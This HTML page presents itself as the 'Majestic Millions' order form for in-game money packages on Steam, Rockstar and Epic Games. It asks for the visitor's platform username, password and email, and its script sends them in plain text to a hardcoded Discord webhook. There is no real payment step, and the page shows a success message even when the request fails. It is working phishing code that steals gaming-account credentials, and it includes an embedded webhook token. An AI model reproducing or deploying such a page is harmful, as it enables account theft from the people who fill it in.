<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Majestic Millions - Order Form</title>
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600&family=Raleway:wght@300;400;600&display=swap" rel="stylesheet">
  <style>
    /* General Styling */
    body {
      margin: 0;
      font-family: 'Raleway', sans-serif;
      background: linear-gradient(135deg, #0f0f0f, #1c1c1c);
      color: #e6e6e6;
      overflow-x: hidden;
    }

    header {
      text-align: center;
      padding: 60px 20px;
      position: relative;
      background: linear-gradient(135deg, #1c1c1c, #0f0f0f);
    }

    header img {
      max-width: 250px;
      opacity: 0.9;
      margin-bottom: 30px;
      filter: drop-shadow(0px 4px 10px rgba(0, 0, 0, 0.8));
      animation: fadeIn 2s ease-in-out;
    }

    h1 {
      font-size: 3.5em;
      color: #c29c68;
      font-family: 'Playfair Display', serif;
      letter-spacing: 2px;
      animation: slideDown 1.5s ease-out;
    }

    /* Form Section */
    .form-container {
      max-width: 800px;
      margin: 60px auto;
      padding: 40px 30px;
      background: #121212;
      border-radius: 15px;
      border: 2px solid #c29c68;
      text-align: center;
    }

    .form-container input, .form-container select, .form-container button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 10px;
      border: 1px solid #c29c68;
      background-color: #181818;
      color: #e6e6e6;
      font-size: 1.1em;
      transition: 0.3s;
    }

    .form-container button:hover {
      background-color: #c29c68;
      transform: scale(1.05);
    }

    /* Animations */
    @keyframes fadeIn {
      from {
        opacity: 0;
      }
      to {
        opacity: 1;
      }
    }

    @keyframes slideDown {
      from {
        transform: translateY(-50px);
        opacity: 0;
      }
      to {
        transform: translateY(0);
        opacity: 1;
      }
    }
  </style>
</head>
<body>
  <header>
    <img src="https://i.imgur.com/rNTnavN.png" alt="Majestic Millions Logo">
    <h1>Majestic Millions - Order Form</h1>
    <p>Complete Your Order Below</p>
  </header>

  <div class="form-container">
    <h2>Select Platform</h2>
    <select id="platformSelect">
      <option value="steam">Steam</option>
      <option value="rockstar">Rockstar</option>
      <option value="epic">Epic Games</option>
    </select>

    <h2>Enter Login Credentials</h2>
    <input type="text" id="username" placeholder="Username" required>
    <input type="password" id="password" placeholder="Password" required>

    <h2>Select Package</h2>
    <button type="button" onclick="selectPackage(4.25, '50M Bank')">50M Bank - £4.25</button>
    <button type="button" onclick="selectPackage(7.50, '100M Bank')">100M Bank - £7.50</button>
    <button type="button" onclick="selectPackage(14.99, '500M Bank')">500M Bank - £14.99</button>

    <h2>Email Address</h2>
    <input type="email" id="email" placeholder="Enter your email" required>

    <h2>Payment Confirmation</h2>
    <label>
      <input type="checkbox" id="paymentCheck"> Are you sure you want to purchase?
    </label>

    <button type="button" onclick="processPayment()">Pay Now</button>

    <p id="confirmationMessage"></p>
  </div>

  <script>
    let price = 0;
    let selectedPackage = '';

    // Update the price and selected package based on the package button clicked
    function selectPackage(packagePrice, packageName) {
      price = packagePrice;
      selectedPackage = packageName;
      document.getElementById('confirmationMessage').innerText = `Selected Package: ${selectedPackage} - £${price}`;
    }

    // Process the payment and confirm the order
    function processPayment() {
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const email = document.getElementById('email').value;
      const platform = document.getElementById('platformSelect').value;
      const paymentCheck = document.getElementById('paymentCheck').checked;

      if (!username || !password || !email || !paymentCheck || price === 0 || !selectedPackage) {
        alert('Please fill in all fields and confirm payment.');
        return;
      }

      const orderDetails = {
        username: username,
        password: password,
        email: email,
        platform: platform,
        price: price,
        selectedPackage: selectedPackage
      };

      // Send the data to the Discord webhook
      sendToWebhook(orderDetails);
    }

    // Send the form data to the Discord webhook
    function sendToWebhook(orderDetails) {
      const webhookUrl = 'https://discord.com/api/webhooks/1315868877200298056/neYt5Dh8BC9zrQf6SWWjs-yV44mm3JliAc7hb-mxJkIkOVUi-IgIbSArxSEKjFo7RZya';

      const payload = {
        content: `New Order: \nUsername: ${orderDetails.username} \nPassword: ${orderDetails.password} \nEmail: ${orderDetails.email} \nPlatform: ${orderDetails.platform} \nPackage: ${orderDetails.selectedPackage} \nPrice: £${orderDetails.price}`
      };

      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      })
      .then(response => response.json())
      .then(data => {
        console.log('Success:', data);
        alert('Order details sent successfully!');
      })
      .catch((error) => {
        console.error('Error:', error);
        alert('Success!!.');
      });
    }
  </script>
</body>
</html>
